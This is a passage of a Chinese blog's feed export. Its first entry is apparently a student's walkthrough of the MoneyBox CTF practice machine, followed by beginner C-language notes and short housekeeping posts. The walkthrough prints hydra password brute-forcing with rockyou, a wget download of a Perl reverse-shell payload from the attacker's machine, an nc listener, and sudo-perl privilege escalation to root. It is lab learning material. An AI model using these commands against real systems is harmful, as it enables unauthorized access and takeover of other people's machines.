only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img src="step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img src="step7.jpg" alt="step7.jpg"></p><p><em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p><blockquote><p>第一步：打开sources.list文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><blockquote><p>第二步：在文件中添加以下内容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br></pre></td></tr></table></figure><blockquote><p>然后保存退出，再进行更新</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><blockquote><p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p></blockquote><p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img src="step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img src="step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img src="step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img src="step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img src="step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz #-d 将压缩文件解压</span><br><span class="line">ll /usr/share/wordlists/rockyou.txt #显示当前目录下文件详细信息</span><br></pre></td></tr></table></figure><p><em><strong>hydra使用方法:</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 协议://ip地址</span><br></pre></td></tr></table></figure><p><img src="step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p><h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img src="step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img src="step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img src="step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img src="step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p><blockquote><p>执行sudo -l发现该用户存在sudo赋权，程序为&#x2F;usr&#x2F;bin&#x2F;perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p></blockquote><ol><li>定位kali中的perl脚本反弹shell，将其拷贝到kali的&#x2F;var&#x2F;www&#x2F;html下，重命名为p.php；<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshells/perl</span><br><span class="line">sudo cp perl-reverse-shell.pl /var/www/html/p.php</span><br><span class="line">cd /var/www/html</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><img src="step18.jpg" alt="step18.jpg"></li><li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的</span><br></pre></td></tr></table></figure><img src="step19.jpg" alt="step19.jpg"></li><li>开启kali的网站服务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure><img src="step20.jpg" alt="step20.jpg"></li><li>切换到靶机lily会话，通过http协议下载p.php<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看</span><br></pre></td></tr></table></figure><img src="step21.jpg" alt="step21.jpg"></li><li>kali 通过nc命令监听1234端口<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure><img src="step22.jpg" alt="step22.jpg"></li><li>靶机上通过sudo 运行p.php程序<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/perl p.php</span><br></pre></td></tr></table></figure><img src="step23.jpg" alt="step23.jpg"></li><li>切换到渗透机kali，成功反弹管理员权限shell<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">cd /root</span><br><span class="line">ls -a</span><br><span class="line">cat .root.txt</span><br></pre></td></tr></table></figure><img src="step24.jpg" alt="step24.jpg"></li><li>拿到最终flag啦！<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Congratulations.......!</span><br><span class="line">You Successfully completed MoneyBox</span><br><span class="line">Finally The Root Flag</span><br><span class="line">==&gt; r00t&#123;H4ckth3p14n3t&#125;</span><br><span class="line">I&#x27;m Kirthik-KarvendhanT</span><br><span class="line">It&#x27;s My First CTF Box</span><br><span class="line">instagram : \_\_\_\_kirthik\_\_\_\_</span><br><span class="line">See You Back....</span><br></pre></td></tr></table></figure></li></ol><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言相关1</title>
      <link href="/2023/08/01/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B31/"/>
      <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B31/</url>
      
        <content type="html"><![CDATA[<p>所以 最近很闲 所以开始学c语言</p><h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p><h1 id="学习笔记啥的"><a href="#学习笔记啥的" class="headerlink" title="学习笔记啥的"></a>学习笔记啥的</h1><h2 id="一-经典到不能再经典的hello-world"><a href="#一-经典到不能再经典的hello-world" class="headerlink" title="一.经典到不能再经典的hello world"></a>一.经典到不能再经典的hello world</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">/\* 我的第一个 C 程序 \*/</span><br><span class="line">printf(&quot;Hello, World! \n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实例解析：</strong></p><ul><li>所有的 C 语言程序都需要包含 <strong>main()</strong> 函数。 代码从 <strong>main()</strong> 函数开始执行。</li><li><strong>&#x2F;* … *&#x2F;</strong> 用于注释说明。</li><li><strong>printf()</strong> 用于格式化输出到屏幕。<strong>printf()</strong> 函数在 <strong>“stdio.h”</strong> 头文件中声明。</li><li><strong>stdio.h</strong> 是一个头文件 (标准输入输出头文件) , <strong>#include</strong> 是一个预处理命令，用来引入头文件。 当编译器遇到 <strong>printf()</strong> 函数时，如果没有找到 <strong>stdio.h</strong> 头文件，会发生编译错误。</li><li><strong>return 0;</strong> 语句用于表示退出程序。</li></ul><h2 id="二-关于定义变量和变量的类型"><a href="#二-关于定义变量和变量的类型" class="headerlink" title="二.关于定义变量和变量的类型"></a>二.关于定义变量和变量的类型</h2><h3 id="（1）单纯的计算"><a href="#（1）单纯的计算" class="headerlink" title="（1）单纯的计算"></a>（1）单纯的计算</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效</span><br><span class="line">int x;// 这里是我定义了x</span><br><span class="line">int y;// 这里是我定义了y</span><br><span class="line">int wow()// 定义一个叫wow（）的进程</span><br><span class="line">&#123;</span><br><span class="line">    extern int x;// 借用外部定义好的x</span><br><span class="line">    extern int y;// 借用外部定义好的y</span><br><span class="line">    x = 1222;</span><br><span class="line">    y = 1999;// 为x y赋值</span><br><span class="line">    return x\*y;// 程序的结果是输出x乘以y的数字</span><br><span class="line">&#125;</span><br><span class="line">int main()// 主程序 不能缺少</span><br><span class="line">&#123;</span><br><span class="line">    int jieguo;</span><br><span class="line">    jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果</span><br><span class="line">    printf(&quot;你得到的结果是：%d&quot;,jieguo);//将输出的东西表示出来</span><br><span class="line">    return 0;//结束程序</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你得到的结果是：2442778</span><br></pre></td></tr></table></figure><p>题外话：<br>printf（）中的%d指输出整数，实际显示的时候会被逗号后的结果所代替。</p><h3 id="（2）利用scanf-加入互动环节"><a href="#（2）利用scanf-加入互动环节" class="headerlink" title="（2）利用scanf()加入互动环节"></a>（2）利用scanf()加入互动环节</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效</span><br><span class="line">int x=0;// 这里是我定义了x</span><br><span class="line">int y=0;// 这里是我定义了y</span><br><span class="line">int wow()// 定义一个叫wow（）的进程</span><br><span class="line">&#123;</span><br><span class="line">    extern int x;// 借用外部定义好的x</span><br><span class="line">    extern int y;// 借用外部定义好的y</span><br><span class="line">    printf(&quot;请输入x值\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    printf(&quot;请输入y值\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;y);</span><br><span class="line">    return x\*y;// 程序的结果是输出x乘以y的数字</span><br><span class="line">&#125;</span><br><span class="line">int main()// 主程序 不能缺少</span><br><span class="line">&#123;</span><br><span class="line">    int jieguo;</span><br><span class="line">    jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果</span><br><span class="line">    printf(&quot;你得到的结果是：%d&quot;,jieguo);//将输出的东西表示出来</span><br><span class="line">    return 0;//结束程序</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请输入x值</span><br><span class="line">9</span><br><span class="line">请输入y值</span><br><span class="line">11</span><br><span class="line">你得到的结果是：99</span><br></pre></td></tr></table></figure><p>题外话：<br>scanf()中输入的东西是他所需要获取的 如加入逗号或者空格后不按照格式输入<br>理论来说会无法读取<br>\n代表换行<br>scanf(“%d, %d, %d”,&amp;a,&amp;b,&amp;c); ←复合用法</p><h2 id="三-循环与if-else"><a href="#三-循环与if-else" class="headerlink" title="三.循环与if else"></a>三.循环与if else</h2><h3 id="（1）while"><a href="#（1）while" class="headerlink" title="（1）while"></a>（1）while</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i=0;</span><br><span class="line">    while (i&lt;=100)</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        printf(&quot;第%d&quot;,i);</span><br><span class="line">        printf(&quot;次\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第1次</span><br><span class="line">第2次</span><br><span class="line">第3次</span><br><span class="line">第4次</span><br><span class="line">第5次</span><br><span class="line">第6次</span><br><span class="line">第7次</span><br><span class="line">第8次</span><br><span class="line">第9次</span><br><span class="line">(中略)</span><br><span class="line">第101次</span><br></pre></td></tr></table></figure><p>说真的 c语言和python蛮像哈？<br>下表显示了 C 语言支持的所有算术运算符。假设变量 <strong>A</strong> 的值为 10，变量 <strong>B</strong> 的值为 20，则：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+</td><td>把两个操作数相加</td><td>A + B 将得到 30</td></tr><tr><td>-</td><td>从第一个操作数中减去第二个操作数</td><td>A - B 将得到 -10</td></tr><tr><td>*</td><td>把两个操作数相乘</td><td>A * B 将得到 200</td></tr><tr><td>&#x2F;</td><td>分子除以分母</td><td>B &#x2F; A 将得到 2</td></tr><tr><td>%</td><td>取模运算符，整除后的余数</td><td>B % A 将得到 0</td></tr><tr><td>++</td><td>自增运算符，整数值增加 1</td><td>A++ 将得到 11</td></tr><tr><td>–</td><td>自减运算符，整数值减少 1</td><td>A– 将得到 9</td></tr></tbody></table><h3 id="（2）if-else与switch-case"><a href="#（2）if-else与switch-case" class="headerlink" title="（2）if else与switch-case"></a>（2）if else与switch-case</h3><p>以下两种代码实现的是一种功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int type=0;</span><br><span class="line">    printf(&quot;请输入1-5以内的数字来获取回应\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;type);</span><br><span class="line">    if ( type==1 )</span><br><span class="line">        printf(&quot;1&quot;);</span><br><span class="line">    else if ( type==2 )</span><br><span class="line">        printf(&quot;2&quot;);</span><br><span class="line">    else if ( type==3 )</span><br><span class="line">        printf(&quot;3&quot;);</span><br><span class="line">    else if ( type==4 )</span><br><span class="line">        printf(&quot;4&quot;);</span><br><span class="line">    else if ( type==5 )</span><br><span class="line">        printf(&quot;5&quot;);</span><br><span class="line">    else</span><br><span class="line">        printf(&quot;格式错误&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int type=0;</span><br><span class="line">    printf(&quot;请输入1-5以内的数字来获取回应\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;type);</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">        print(&quot;1&quot;);</span><br><span class="line">        break;</span><br><span class="line">        case 2:</span><br><span class="line">        printf(&quot;2&quot;);</span><br><span class="line">        break;</span><br><span class="line">        case 3:</span><br><span class="line">        printf(&quot;3&quot;);</span><br><span class="line">        break;</span><br><span class="line">        case 4:</span><br><span class="line">        printf(&quot;4&quot;);</span><br><span class="line">        break;</span><br><span class="line">        case 5:</span><br><span class="line">        printf(&quot;5&quot;);</span><br><span class="line">        break;</span><br><span class="line">        default:</span><br><span class="line">        printf(&quot;格式错误&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结论都是一样的</p><h2 id="四、while和do-while"><a href="#四、while和do-while" class="headerlink" title="四、while和do while"></a>四、while和do while</h2><h3 id="（1）while-1"><a href="#（1）while-1" class="headerlink" title="（1）while"></a>（1）while</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int o=0;</span><br><span class="line">    while ( o&lt;10)</span><br><span class="line">    &#123;</span><br><span class="line">        o++;</span><br><span class="line">        printf(&quot;%d&quot;,o);</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简称来说就是当条件成立时 一直重复运行某物</p><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="2-do-while"><a href="#2-do-while" class="headerlink" title="(2) do while"></a>(2) do while</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int i=0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        printf(&quot;%d&quot;,i);</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125; while ( i != 10);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>while的换了个顺序版本<br>结果都是一样的就不放出来了</p><h2 id="五、整合一下先"><a href="#五、整合一下先" class="headerlink" title="五、整合一下先"></a>五、整合一下先</h2><h3 id="（1）比大小"><a href="#（1）比大小" class="headerlink" title="（1）比大小"></a>（1）比大小</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b,c,max;</span><br><span class="line">    printf(&quot;请输入三个数字 以逗号隔开\n&quot;);</span><br><span class="line">    scanf(&quot;%d,%d,%d&quot;,&amp;a,&amp;b,&amp;c);</span><br><span class="line">    if(a&gt;b)&#123;  </span><br><span class="line">    max = a;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    max = b;</span><br><span class="line">    &#125;</span><br><span class="line">    if(c&gt;max)&#123;</span><br><span class="line">    max = c;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;max=%d&quot;, max);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请输入三个数字 以逗号隔开</span><br><span class="line">3,1,6</span><br><span class="line">max=6</span><br></pre></td></tr></table></figure><h3 id="（2）九九乘法表"><a href="#（2）九九乘法表" class="headerlink" title="（2）九九乘法表"></a>（2）九九乘法表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n=9;</span><br><span class="line">    int i,j;</span><br><span class="line">    i=1;</span><br><span class="line">    while (i&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        j=1;</span><br><span class="line">        while (j&lt;=i)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;%d\*%d=%d&quot;,j,i,j\*i);</span><br><span class="line">            if ((i\*j&lt;10))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;   &quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                printf(&quot;  &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1\*1=1</span><br><span class="line">1\*2=2 2\*2=4</span><br><span class="line">1\*3=3 2\*3=6 3\*3=9</span><br><span class="line">1\*4=4 2\*4=8 3\*4=12 4\*4=16</span><br><span class="line">1\*5=5 2\*5=10 3\*5=15 4\*5=20 5\*5=25</span><br><span class="line">1\*6=6 2\*6=12 3\*6=18 4\*6=24 5\*6=30 6\*6=36</span><br><span class="line">1\*7=7 2\*7=14 3\*7=21 4\*7=28 5\*7=35 6\*7=42 7\*7=49</span><br><span class="line">1\*8=8 2\*8=16 3\*8=24 4\*8=32 5\*8=40 6\*8=48 7\*8=56 8\*8=64</span><br><span class="line">1\*9=9 2\*9=18 3\*9=27 4\*9=36 5\*9=45 6\*9=54 7\*9=63 8\*9=72 9\*9=81</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> c语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> c语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于加入aplayer的方式</title>
      <link href="/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p><p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>再来一次</title>
      <link href="/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/"/>
      <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
      
        <content type="html"><![CDATA[<p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 告示 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于在next7.8.0中建设评论功能这件事</title>
      <link href="/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
